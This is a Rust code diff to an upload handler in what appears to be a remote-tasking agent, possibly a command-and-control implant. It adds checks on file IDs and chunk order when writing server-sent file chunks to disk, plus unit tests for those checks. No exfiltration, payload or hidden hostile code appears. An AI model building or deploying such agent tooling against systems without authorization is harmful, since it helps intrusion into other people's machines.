@@ -81,6 +81,7 @@ struct PendingUpload {
     max_bytes: u64,
     written: u64,
     chunk_size: u32,
+    next_chunk: u32,
     host: Option<String>,
 }
 
@@ -197,6 +198,32 @@ pub fn responses_from_receipts(receipts: &[PostResponseReceipt]) -> Vec<TaskResp
             continue;
         }
 
+        if receipt.file_id != Some(state.file_id) {
+            out.push(cleanup_failed_upload(
+                &state,
+                "upload chunk response file_id did not match requested file",
+            ));
+            continue;
+        }
+
+        let Some(chunk_num) = receipt.chunk_num else {
+            out.push(cleanup_failed_upload(
+                &state,
+                "upload chunk response did not include chunk_num",
+            ));
+            continue;
+        };
+        if chunk_num != state.next_chunk {
+            out.push(cleanup_failed_upload(
+                &state,
+                &format!(
+                    "upload chunk response was {chunk_num}, expected {}",
+                    state.next_chunk
+                ),
+            ));
+            continue;
+        }
+
         let Some(chunk_data) = receipt.chunk_data.as_deref() else {
             out.push(cleanup_failed_upload(
                 &state,
@@ -222,7 +249,6 @@ pub fn responses_from_receipts(receipts: &[PostResponseReceipt]) -> Vec<TaskResp
             continue;
         }
 
-        let chunk_num = receipt.chunk_num.unwrap_or(1);
         let file_result = std::fs::OpenOptions::new()
             .create(true)
             .write(true)
@@ -248,6 +274,7 @@ pub fn responses_from_receipts(receipts: &[PostResponseReceipt]) -> Vec<TaskResp
             out.push(upload_complete_response(&state));
         } else {
             let next_chunk = chunk_num + 1;
+            state.next_chunk = next_chunk;
             out.push(upload_request(&state, next_chunk));
             pending_uploads_lock().insert(state.task_id, state);
         }
@@ -307,6 +334,7 @@ pub fn handle(task: &TaskMessage) -> TaskResponse {
                 .clamp(1, MAX_UPLOAD_BYTES),
             written: 0,
             chunk_size: UPLOAD_CHUNK_SIZE,
+            next_chunk: 1,
             host: params.host.filter(|h| !h.trim().is_empty()),
         };
         let response = upload_request(&state, 1);
@@ -487,6 +515,86 @@ mod tests {
         assert_eq!(std::fs::read(&tmp_path).unwrap(), original);
 
         let _ = std::fs::remove_file(tmp_path);
+    }
+
+    #[test]
+    fn test_upload_rejects_mismatched_file_id_receipt() {
+        let file_id = Uuid::new_v4();
+        let tmp_path = {
+            let mut p = std::env::temp_dir();
+            p.push(format!(
+                "nanaz_up_bad_file_id_test_{}_{}.bin",
+                std::process::id(),
+                file_id
+            ));
+            p
+        };
+
+        let task = TaskMessage {
+            id: Uuid::new_v4(),
+            command: "upload".into(),
+            parameters: serde_json::json!({
+                "path": tmp_path.to_string_lossy(),
+                "file_id": file_id,
+            })
+            .to_string(),
+            ..Default::default()
+        };
+        let request = handle(&task);
+        assert_eq!(request.status.as_deref(), Some("processing"));
+
+        let responses = responses_from_receipts(&[PostResponseReceipt {
+            task_id: task.id,
+            status: "success".into(),
+            file_id: Some(Uuid::new_v4()),
+            chunk_num: Some(1),
+            total_chunks: Some(1),
+            chunk_data: Some(crate::common::base64::encode(b"wrong file")),
+            ..Default::default()
+        }]);
+        assert_eq!(responses.len(), 1);
+        assert_eq!(responses[0].status.as_deref(), Some("error"));
+        assert!(!tmp_path.exists());
+    }
+
+    #[test]
+    fn test_upload_rejects_unexpected_chunk_number() {
+        let file_id = Uuid::new_v4();
+        let tmp_path = {
+            let mut p = std::env::temp_dir();
+            p.push(format!(
+                "nanaz_up_bad_chunk_test_{}_{}.bin",
+                std::process::id(),
+                file_id
+            ));
+            p
+        };
+
+        let task = TaskMessage {
+            id: Uuid::new_v4(),
+            command: "upload".into(),
+            parameters: serde_json::json!({
+                "path": tmp_path.to_string_lossy(),
+                "file_id": file_id,
+            })
+            .to_string(),
+            ..Default::default()
+        };
+        let request = handle(&task);
+        assert_eq!(request.status.as_deref(), Some("processing"));
+
+        let responses = responses_from_receipts(&[PostResponseReceipt {
+            task_id: task.id,
+            status: "success".into(),
+            file_id: Some(file_id),
+            chunk_num: Some(2),
+            total_chunks: Some(2),
+            chunk_data: Some(crate::common::base64::encode(b"out of order")),
+            ..Default::default()
+        }]);
+        assert_eq!(responses.len(), 1);
+        assert_eq!(responses[0].status.as_deref(), Some("error"));
+        assert!(!tmp_path.exists());
     }
 
     #[test]
